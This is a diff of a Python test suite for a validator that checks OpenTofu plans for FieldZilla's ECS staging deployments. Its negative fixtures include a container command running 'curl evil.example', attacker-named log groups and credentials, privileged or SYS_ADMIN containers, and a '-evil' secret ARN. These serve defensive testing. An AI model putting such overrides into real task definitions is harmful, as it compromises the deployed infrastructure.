@@ -21,6 +21,10 @@ import opentofu_plan_authorization as auth  # noqa: E402
 VALID_SHA = "a" * 40
 DEPLOY_SHA = "ef924580fb690c1e8ec9dc0f27fa1d27b204c111"
 IMAGE_DIGEST = "sha256:" + "9" * 64
+API_REPO = "synergie/fieldzilla/staging/api"
+ADMIN_WEB_REPO = "synergie/fieldzilla/staging/admin-web"
+DIGEST_MAP = {API_REPO: "sha256:" + "9" * 64, ADMIN_WEB_REPO: "sha256:" + "8" * 64}
+DIGEST_MAP_JSON = json.dumps(DIGEST_MAP, sort_keys=True)
 ECS_FAMILIES = ",".join(sorted(auth.APPROVED_FIELDZILLA_TASK_FAMILIES))
 VALID_PLAN = "b" * 64
 VALID_IMPORT_MAP = "c" * 64
@@ -41,6 +45,7 @@ def valid_args(**overrides: object) -> Namespace:
         "expected_plan_sha256": VALID_PLAN,
         "expected_import_map_sha256": VALID_IMPORT_MAP,
         "image_digest": "",
+        "image_digest_map": "",
         "ecs_families": "",
         "expires_at": "2026-09-12T05:30:00Z",
         "authorization_id": "fieldzilla-20260912-01",
@@ -101,7 +106,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
         self.assert_rejected(expires_at="2026-09-12T06:01:00Z")
         self.assert_rejected(authorization_id="../bad")
         self.assert_rejected(native_reviewers_available="true")
-        self.assert_rejected(image_digest="not-a-digest")
+        self.assert_rejected(image_digest_map="not-a-digest")
         self.assert_rejected(ecs_families="fieldzilla-staging-api")
 
     def test_verifies_native_reviewer_fallback_from_environment_rules(self) -> None:
@@ -219,7 +224,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
                         "repository_id": 1315697868,
                         "environment": "synergie-app-staging",
                         "commit_sha": VALID_SHA,
-                        "image_digest": IMAGE_DIGEST,
+                        "image_digest_map": DIGEST_MAP,
                         "ecs_families": sorted(auth.APPROVED_FIELDZILLA_TASK_FAMILIES),
                         "workflow_run_id": "34706513572",
                         "artifact_name": artifact_name,
@@ -238,7 +243,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
                     expected_sha=VALID_SHA,
                     expected_plan_sha256=plan_sha,
                     expected_import_map_sha256=import_sha,
-                    image_digest=IMAGE_DIGEST,
+                    image_digest_map=DIGEST_MAP_JSON,
                     ecs_families=ECS_FAMILIES,
                     source_run_id="34706513572",
                     artifact_id="123456",
@@ -261,7 +266,6 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             {
                 **before_containers[0],
                 "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/synergie/fieldzilla/staging/api:{DEPLOY_SHA}",
-                "imageDigest": IMAGE_DIGEST,
             }
         ]
         before = {
@@ -303,19 +307,23 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
                 },
             ],
         }
-        args = Namespace(plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest=IMAGE_DIGEST, ecs_families=ECS_FAMILIES)
+        args = Namespace(plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map=DIGEST_MAP_JSON, ecs_families=ECS_FAMILIES)
         with tempfile.TemporaryDirectory() as tmp:
             plan_json = Path(tmp) / "plan.json"
             plan_json.write_text(json.dumps(base), encoding="utf-8")
             auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
 
-            wrong_digest = json.loads(json.dumps(base))
-            containers = json.loads(wrong_digest["resource_changes"][0]["change"]["after"]["container_definitions"])
-            containers[0]["imageDigest"] = "sha256:" + "8" * 64
-            wrong_digest["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(containers)
-            plan_json.write_text(json.dumps(wrong_digest), encoding="utf-8")
+            # Missing digest evidence for the repository this container actually uses.
+            missing_repo_digest = json.loads(json.dumps(base))
+            plan_json.write_text(json.dumps(missing_repo_digest), encoding="utf-8")
+            bad_args = Namespace(**{**vars(args), "image_digest_map": json.dumps({ADMIN_WEB_REPO: DIGEST_MAP[ADMIN_WEB_REPO]})})
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(bad_args)))
+
+            # Malformed digest map (not valid JSON) must fail closed, not silently pass through.
+            malformed_args = Namespace(**{**vars(args), "image_digest_map": "not-json"})
+            with self.assertRaises(SystemExit):
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(malformed_args)))
 
             destructive = json.loads(json.dumps(base))
             destructive["resource_changes"].append(
@@ -330,6 +338,66 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             plan_json.write_text(json.dumps(role_broadening), encoding="utf-8")
             with self.assertRaises(SystemExit):
                 auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
+
+    def test_legacy_image_digest_input_still_accepted(self) -> None:
+        """The deprecated scalar --image-digest input must remain a valid, accepted
+        action/CLI input during the staged rollout of image-digest-map -- callers still
+        wired to the old interface must not break. It is deliberately NOT an effective
+        digest check against real plans (real container_definitions carry no imageDigest
+        field), which is why new callers must use image_digest_map instead; this test only
+        proves the input contract itself did not regress."""
+        auth.verify_inputs(valid_args(image_digest=IMAGE_DIGEST), now=NOW)
+        self.assert_rejected(image_digest="not-a-digest")
+
+        containers = [
+            {
+                "name": "api",
+                "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{API_REPO}:{DEPLOY_SHA}",
+                "cpu": 256,
+                "memory": 512,
+                "essential": True,
+                # Real plans never carry this -- included here only to exercise the legacy
+                # code path's accept case; test_real_pending_fieldzilla_plan_shape covers
+                # the real (imageDigest-absent) shape via image_digest_map instead.
+                "imageDigest": IMAGE_DIGEST,
+            }
+        ]
+        before = {
+            "family": "fieldzilla-staging-api",
+            "cpu": "256",
+            "memory": "512",
+            "network_mode": "bridge",
+            "requires_compatibilities": ["EC2"],
+            "execution_role_arn": "arn:aws:iam::918870682888:role/SynergieFieldzillaStagingEcsExecution",
+            "task_role_arn": "arn:aws:iam::918870682888:role/SynergieFieldzillaStagingTask",
+            "container_definitions": json.dumps([{**containers[0], "image": f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{API_REPO}:774051cf74a7b8ada2f26e5c24959fdc99d6380b"}], sort_keys=True),
+            "runtime_platform": [],
+            "track_latest": False,
+            "volume": [],
+        }
+        after = {**before, "container_definitions": json.dumps(containers, sort_keys=True)}
+        plan = {
+            "variables": {
+                "enable_production": {"value": False},
+                "route53_zone_id": {"value": ""},
+                "container_instance_type": {"value": "c6g.medium"},
+                "monthly_budget_usd": {"value": "100"},
+                "image_tag": {"value": DEPLOY_SHA},
+            },
+            "resource_changes": [
+                {
+                    "address": 'aws_ecs_task_definition.api["staging"]',
+                    "type": "aws_ecs_task_definition",
+                    "change": {"actions": ["delete", "create"], "before": before, "after": after},
+                }
+            ],
+        }
+        with tempfile.TemporaryDirectory() as tmp:
+            plan_json = Path(tmp) / "plan.json"
+            plan_json.write_text(json.dumps(plan), encoding="utf-8")
+            # Legacy image_digest alone (no image_digest_map) must not error out the
+            # input contract, even though it cannot verify anything against a real plan.
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest=IMAGE_DIGEST, image_digest_map="", ecs_families=""))
 
     def test_rejects_artifact_substitution_and_prohibited_files(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -454,7 +522,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as tmp:
             plan_json = Path(tmp) / "plan.json"
             plan_json.write_text(json.dumps(plan), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             normalized_empty_fields = json.loads(json.dumps(plan))
             normalized_empty_fields["resource_changes"][0]["change"]["before"]["ipc_mode"] = ""
@@ -462,7 +530,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             normalized_empty_fields["resource_changes"][0]["change"]["before"]["pid_mode"] = ""
             normalized_empty_fields["resource_changes"][0]["change"]["after"]["pid_mode"] = None
             plan_json.write_text(json.dumps(normalized_empty_fields), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             approved_previous_sha = "774051cf74a7b8ada2f26e5c24959fdc99d6380b"
             approved_previous = json.loads(json.dumps(plan))
@@ -473,7 +541,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             )
             approved_previous["resource_changes"][0]["change"]["before"]["container_definitions"] = json.dumps(previous_containers)
             plan_json.write_text(json.dumps(approved_previous), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             last_deployed = json.loads(json.dumps(plan))
             last_deployed_containers = json.loads(last_deployed["resource_changes"][0]["change"]["before"]["container_definitions"])
@@ -483,14 +551,14 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             )
             last_deployed["resource_changes"][0]["change"]["before"]["container_definitions"] = json.dumps(last_deployed_containers)
             plan_json.write_text(json.dumps(last_deployed), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             wrong_target_sha = json.loads(json.dumps(plan))
             wrong_target_sha["variables"]["image_tag"]["value"] = "1111111111111111111111111111111111111111"
             plan_json.write_text(json.dumps(wrong_target_sha), encoding="utf-8")
             with self.assertRaises(SystemExit):
                 auth.verify_plan_safety(
-                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
+                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families="")
                 )
 
             unsafe_pid_mode = json.loads(json.dumps(plan))
@@ -539,14 +607,14 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
                 "after": None,
             }
             plan_json.write_text(json.dumps(retired_revision), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             wrong_family_retirement = json.loads(json.dumps(retired_revision))
             wrong_family_retirement["resource_changes"][0]["change"]["before"]["family"] = "fieldzilla-production-api"
             plan_json.write_text(json.dumps(wrong_family_retirement), encoding="utf-8")
             with self.assertRaises(SystemExit):
                 auth.verify_plan_safety(
-                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
+                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families="")
                 )
 
             wrong_image_retirement = json.loads(json.dumps(retired_revision))
@@ -559,7 +627,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             plan_json.write_text(json.dumps(wrong_image_retirement), encoding="utf-8")
             with self.assertRaises(SystemExit):
                 auth.verify_plan_safety(
-                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families="")
+                    Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families="")
                 )
 
     def test_runtime_secret_addition_approved_and_other_mutations_rejected(self) -> None:
@@ -607,7 +675,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
 
             # Approved: existing secret unchanged, one new runtime secret added.
             plan_json.write_text(json.dumps(plan), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Approved: two new runtime secrets added.
             second_new = {"name": "APP_CORS_ORIGINS", "valueFrom": f"{runtime_prefix}APP_CORS_ORIGINS::"}
@@ -616,7 +684,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             cs[0]["secrets"] = [existing_secret, new_secret, second_new]
             two_new["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(two_new), encoding="utf-8")
-            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+            auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Rejected: existing secret removed from after.
             missing_existing = json.loads(json.dumps(plan))
@@ -625,7 +693,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             missing_existing["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(missing_existing), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Rejected: new secret's valueFrom references a non-runtime ARN.
             bad_arn = json.loads(json.dumps(plan))
@@ -634,7 +702,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             bad_arn["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(bad_arn), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Rejected: new secret references a different account's runtime ARN.
             foreign_arn = json.loads(json.dumps(plan))
@@ -643,7 +711,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             foreign_arn["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(foreign_arn), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Rejected: existing secret's valueFrom mutated.
             mutated_existing = json.loads(json.dumps(plan))
@@ -652,7 +720,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             mutated_existing["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(mutated_existing), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Rejected: non-secret container field mutated (essential flag changed) alongside valid secret add.
             mutated_field = json.loads(json.dumps(plan))
@@ -662,7 +730,7 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             mutated_field["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(mutated_field), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
 
             # Rejected: new secret references the production environment rather than staging.
             prod_env = json.loads(json.dumps(plan))
@@ -671,7 +739,430 @@ class FieldZillaPlanAuthorizationTests(unittest.TestCase):
             prod_env["resource_changes"][0]["change"]["after"]["container_definitions"] = json.dumps(cs)
             plan_json.write_text(json.dumps(prod_env), encoding="utf-8")
             with self.assertRaises(SystemExit):
-                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest="", ecs_families=""))
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, plan_kind="normal", expected_sha=DEPLOY_SHA, image_digest_map="", ecs_families=""))
+
+    def test_new_task_definition_create_with_no_prior_state(self) -> None:
+        """A task-definition create with no prior Terraform state (e.g. superseding a
+        manually created revision) is approved only against an exact, per-family design
+        baseline sourced from reviewed IaC -- exercises the exact FieldZilla plan shape for
+        all four families and every adversarial rejection of that baseline, including
+        cross-family/repository mismatches, incomplete run authorization, the two-repository
+        digest map, and exact secret ARN/key-set binding. Container fixtures below carry only
+        the keys the reviewed Terraform source actually emits for each family -- no invented
+        `imageDigest`, `cpu`, `memory`, or other fields real `tofu show -json` never sets."""
+        runtime_arn = auth.EXACT_RUNTIME_SECRET_ARN
+
+        def approved_secrets(keys: frozenset[str]) -> list[dict[str, str]]:
+            return [{"name": key, "valueFrom": f"{runtime_arn}:{key}::"} for key in sorted(keys)]
+
+        def make_container(family: str, **overrides: object) -> dict[str, object]:
+            family_baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE.get(family, auth.FIELDZILLA_TASK_DEFINITION_BASELINE["fieldzilla-staging-api"])
+            baseline_container = dict(family_baseline["container"])
+            repo = family_baseline["ecr_repository"]
+            secret_keys = overrides.pop("secret_keys", baseline_container["secret_keys"])
+            container = {k: v for k, v in baseline_container.items() if k != "secret_keys"}
+            container["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{repo}:{DEPLOY_SHA}"
+            secrets = approved_secrets(secret_keys)
+            if secrets:
+                container["secrets"] = secrets
+            container.update(overrides)
+            return container
+
+        def make_after(family: str = "fieldzilla-staging-api", container_overrides: dict[str, object] | None = None, containers: list[dict[str, object]] | None = None, **overrides: object) -> dict[str, object]:
+            baseline = auth.FIELDZILLA_TASK_DEFINITION_BASELINE.get(family, auth.FIELDZILLA_TASK_DEFINITION_BASELINE["fieldzilla-staging-api"])
+            if containers is None:
+                containers = [make_container(family, **(container_overrides or {}))]
+            after = {
+                "family": family,
+                "cpu": baseline["cpu"],
+                "memory": baseline["memory"],
+                "execution_role_arn": baseline["execution_role_arn"],
+                "task_role_arn": baseline["task_role_arn"],
+                "network_mode": baseline["network_mode"],
+                "requires_compatibilities": baseline["requires_compatibilities"],
+                "runtime_platform": baseline["runtime_platform"],
+                "volume": baseline["volume"],
+                "placement_constraints": baseline["placement_constraints"],
+                "proxy_configuration": baseline["proxy_configuration"],
+                "ephemeral_storage": baseline["ephemeral_storage"],
+                "container_definitions": json.dumps(containers, sort_keys=True),
+            }
+            after.update(overrides)
+            return after
+
+        def plan_for(after: dict[str, object], family_address: str = "api", ecs_families: str | None = None, image_digest_map: str | None = None) -> tuple[dict[str, object], Namespace]:
+            plan = {
+                "variables": {
+                    "enable_production": {"value": False},
+                    "route53_zone_id": {"value": ""},
+                    "container_instance_type": {"value": "c6g.medium"},
+                    "monthly_budget_usd": {"value": "100"},
+                    "image_tag": {"value": DEPLOY_SHA},
+                },
+                "resource_changes": [
+                    {
+                        "address": f'aws_ecs_task_definition.{family_address}["staging"]',
+                        "type": "aws_ecs_task_definition",
+                        "change": {"actions": ["create"], "before": None, "after": after},
+                    }
+                ],
+            }
+            args = Namespace(
+                plan_kind="normal",
+                expected_sha=DEPLOY_SHA,
+                image_digest_map=DIGEST_MAP_JSON if image_digest_map is None else image_digest_map,
+                ecs_families=ECS_FAMILIES if ecs_families is None else ecs_families,
+            )
+            return plan, args
+
+        def check(after: dict[str, object], **plan_kwargs: object) -> None:
+            plan, args = plan_for(after, **plan_kwargs)
+            with tempfile.TemporaryDirectory() as tmp:
+                plan_json = Path(tmp) / "plan.json"
+                plan_json.write_text(json.dumps(plan), encoding="utf-8")
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
+
+        def check_rejected(after: dict[str, object], **plan_kwargs: object) -> None:
+            plan, args = plan_for(after, **plan_kwargs)
+            with tempfile.TemporaryDirectory() as tmp:
+                plan_json = Path(tmp) / "plan.json"
+                plan_json.write_text(json.dumps(plan), encoding="utf-8")
+                with self.assertRaises(SystemExit):
+                    auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
+
+        # --- Approved: exact FieldZilla plan shape, one per family, matching the reviewed
+        # Terraform source at 2c8a4015fd4a97d1c582475a6939cf8fb988b2fb exactly (no invented
+        # imageDigest/cpu/memory container keys). ---
+        check(make_after("fieldzilla-staging-api"), family_address="api")
+        check(make_after("fieldzilla-staging-admin-web"), family_address="admin-web")
+        check(make_after("fieldzilla-staging-worker"), family_address="worker")
+        check(make_after("fieldzilla-staging-migration"), family_address="migration")
+
+        # --- Rejected: unapproved family / wrong family-to-repository mapping. ---
+        check_rejected(make_after(family="fieldzilla-production-api"))
+        wrong_repo = make_after("fieldzilla-staging-api")
+        containers = json.loads(wrong_repo["container_definitions"])
+        containers[0]["image"] = f"918870682888.dkr.ecr.ap-south-1.amazonaws.com/{ADMIN_WEB_REPO}:{DEPLOY_SHA}"
+        wrong_repo["container_definitions"] = json.dumps(containers)
+        check_rejected(wrong_repo)
+
+        # --- Rejected: incomplete/empty run authorization for the family set. ---
+        check_rejected(make_after(), ecs_families="")
+        check_rejected(make_after(), ecs_families="fieldzilla-staging-api")
+        check_rejected(make_after(), ecs_families="fieldzilla-staging-api,fieldzilla-staging-worker")
+
+        # --- Rejected: absent, malformed, incomplete, or extra-key digest evidence. Real
+        # container_definitions never carry an imageDigest field, so evidence is required
+        # via the map only -- there is nothing in the container to fall back on. ---
+        check_rejected(make_after(), image_digest_map="")
+        check_rejected(make_after(), image_digest_map="not-json")
+        check_rejected(make_after(), image_digest_map=json.dumps({API_REPO: DIGEST_MAP[API_REPO]}))  # missing admin-web
+        check_rejected(make_after(), image_digest_map=json.dumps({**DIGEST_MAP, "synergie/other/staging/api": "sha256:" + "1" * 64}))  # extra key
+        check_rejected(make_after(), image_digest_map=json.dumps({API_REPO: "not-a-digest", ADMIN_WEB_REPO: DIGEST_MAP[ADMIN_WEB_REPO]}))
+        check_rejected(make_after(), image_digest_map=json.dumps({API_REPO: DIGEST_MAP[API_REPO].upper(), ADMIN_WEB_REPO: DIGEST_MAP[ADMIN_WEB_REPO]}))  # not lowercase hex
+        # Duplicate JSON keys are not canonical and must be rejected, not silently collapsed.
+        duplicate_key_json = (
+            '{"' + API_REPO + '": "' + DIGEST_MAP[API_REPO] + '", "' + ADMIN_WEB_REPO + '": "' + DIGEST_MAP[ADMIN_WEB_REPO]
+            + '", "' + API_REPO + '": "' + DIGEST_MAP[API_REPO] + '"}'
+        )
+        check_rejected(make_after(), image_digest_map=duplicate_key_json)
+        # A container carrying a legacy imageDigest field is harmlessly ignored (stripped
+        # by _container_base, same as "image" and "secrets") -- it grants no bypass, since
+        # digest evidence is read only from image_digest_map, never from the container.
+        harmless_legacy_field = make_after()
+        containers = json.loads(harmless_legacy_field["container_definitions"])
+        containers[0]["imageDigest"] = "sha256:" + "0" * 64  # wrong on purpose -- must not matter
+        harmless_legacy_field["container_definitions"] = json.dumps(containers)
+        check(harmless_legacy_field)
+
+        # --- Rejected: secret ARN is a prefix-collision, not the exact approved secret. ---
+        prefix_collision = make_after()
+        containers = json.loads(prefix_collision["container_definitions"])
+        containers[0]["secrets"] = [{"name": "APP_SECRET_KEY", "valueFrom": f"{runtime_arn}-evil:APP_SECRET_KEY::"}]
+        prefix_collision["container_definitions"] = json.dumps(containers)
+        check_rejected(prefix_collision)
+
+        # --- Rejected: arbitrary/extra secret keys, or a missing required key. ---
+        extra_key = make_after()
+        containers = json.loads(extra_key["container_definitions"])
+        containers[0]["secrets"].append({"name": "ARBITRARY_EXTRA_KEY", "valueFrom": f"{runtime_arn}:ARBITRARY_EXTRA_KEY::"})
+        extra_key["container_definitions"] = json.dumps(containers)
+        check_rejected(extra_key)
+        check_rejected(make_after(container_overrides={"secret_keys": frozenset({"APP_SECRET_KEY"})}))
+        # Worker's expected key set includes APP_ADMIN_WEB_BASE_URL per the reviewed .tf
+        # (unfiltered local.runtime_secret_keys) -- omitting it must be rejected too.
+        check_rejected(make_after("fieldzilla-staging-worker", container_overrides={
+            "secret_keys": frozenset({"APP_SECRET_KEY", "APP_DATABASE_CONTEXT_SECRET", "APP_DATABASE_URL", "APP_FIELD_ENCRYPTION_MASTER_KEY", "APP_CORS_ORIGINS", "APP_WORKER_TENANT_IDS"})
+        }), family_address="worker")
+
+        # --- Rejected: extra container (sidecar). ---
+        sidecar = make_after("fieldzilla-staging-api")
+        containers = json.loads(sidecar["container_definitions"])
+        containers.append(make_container("fieldzilla-staging-api"))
+        sidecar["container_definitions"] = json.dumps(containers)
+        check_rejected(sidecar)
+
+        # --- Rejected: altered command, environment, logging, networking. ---
+        check_rejected(make_after(container_overrides={"command": ["/bin/sh", "-c", "curl evil.example"]}))
+        tampered_env = make_after()
+        containers = json.loads(tampered_env["container_definitions"])
+        containers[0]["environment"] = [{"name": "APP_DEBUG", "value": "true"}]
+        tampered_env["container_definitions"] = json.dumps(containers)
+        check_rejected(tampered_env)
+        check_rejected(make_after(container_overrides={
+            "logConfiguration": {"logDriver": "awslogs", "options": {"awslogs-group": "/attacker/group", "awslogs-region": "ap-south-1", "awslogs-stream-prefix": "ecs"}}
+        }))
+        check_rejected(make_after(container_overrides={"portMappings": [{"containerPort": 22, "hostPort": 22, "protocol": "tcp"}]}))
+        check_rejected(make_after(container_overrides={"mountPoints": [{"sourceVolume": "host", "containerPath": "/host"}]}))
+        check_rejected(make_after(container_overrides={"volumesFrom": [{"sourceContainer": "other"}]}))
+        check_rejected(make_after(container_overrides={"systemControls": [{"namespace": "net.core.somaxconn", "value": "1024"}]}))
+
+        # --- Rejected: any field the reviewed .tf never sets on a container at all --
+        # privileged, user, linuxParameters, repositoryCredentials, healthCheck, dependsOn,
+        # readonlyRootFilesystem, entrypoint, or per-container cpu/memory -- fails the moment
+        # it is present, by construction of the exact-shape equality check. ---
+        for extra_field, value in (
+            ("privileged", True),
+            ("user", "root"),
+            ("linuxParameters", {"capabilities": {"add": ["SYS_ADMIN"]}}),
+            ("repositoryCredentials", {"credentialsParameter": "arn:aws:secretsmanager:ap-south-1:918870682888:secret:attacker"}),
+            ("healthCheck", {"command": ["CMD-SHELL", "exit 1"]}),
+            ("dependsOn", [{"containerName": "sidecar", "condition": "START"}]),
+            ("readonlyRootFilesystem", True),
+            ("entrypoint", ["/bin/sh"]),
+            ("cpu", 128),
+            ("memory", 256),
+        ):
+            check_rejected(make_after(container_overrides={extra_field: value}))
+
+        # --- Rejected: under-sized and over-sized task-level CPU/memory -- exact match only. ---
+        check_rejected(make_after(cpu="128"))
+        check_rejected(make_after(memory="256"))
+        check_rejected(make_after(cpu="512"))
+        check_rejected(make_after(memory="1024"))
+
+        # --- Rejected: unexpected/unknown container field of any kind. ---
+        unknown_field = make_after()
+        containers = json.loads(unknown_field["container_definitions"])
+        containers[0]["extraHosts"] = [{"hostname": "evil", "ipAddress": "10.0.0.1"}]
+        unknown_field["container_definitions"] = json.dumps(containers)
+        check_rejected(unknown_field)
+
+        # --- Rejected: task-level fields outside the approved baseline. ---
+        check_rejected(make_after(execution_role_arn="arn:aws:iam::918870682888:role/Other"))
+        check_rejected(make_after(task_role_arn="arn:aws:iam::918870682888:role/Other"))
+        check_rejected(make_after(network_mode="awsvpc"))
+        check_rejected(make_after(requires_compatibilities=["FARGATE"]))
+        check_rejected(make_after(volume=[{"name": "data"}]))
+        check_rejected(make_after(placement_constraints=[{"type": "memberOf", "expression": "attribute:x == y"}]))
+        check_rejected(make_after(proxy_configuration={"type": "APPMESH"}))
+        check_rejected(make_after(ephemeral_storage={"sizeInGiB": 100}))
+
+        # --- Rejected: malformed plan claims a bare create but still carries a non-null
+        # "before" (should never happen from real OpenTofu output, but must fail closed). ---
+        with tempfile.TemporaryDirectory() as tmp:
+            plan_json = Path(tmp) / "plan.json"
+            plan, args = plan_for(make_after())
+            plan["resource_changes"][0]["change"]["before"] = {"family": "fieldzilla-staging-api"}
+            plan_json.write_text(json.dumps(plan), encoding="utf-8")
+            with self.assertRaises(SystemExit):
+                auth.verify_plan_safety(Namespace(plan_json_path=plan_json, **vars(args)))
+
+        # --- Rejected: "after" missing/not a dict entirely. ---
+        with tempfile.TemporaryDirectory() as tmp:
+            plan_json = Path(tmp) / "plan.json"
+            plan, args = plan_for(make_after())
+            plan["resource_changes"][0]["change"]["after"] = None
+            plan_json.write_text(json.dumps(plan), encoding="utf-8")
+            with self.assertRaises(SystemExit):
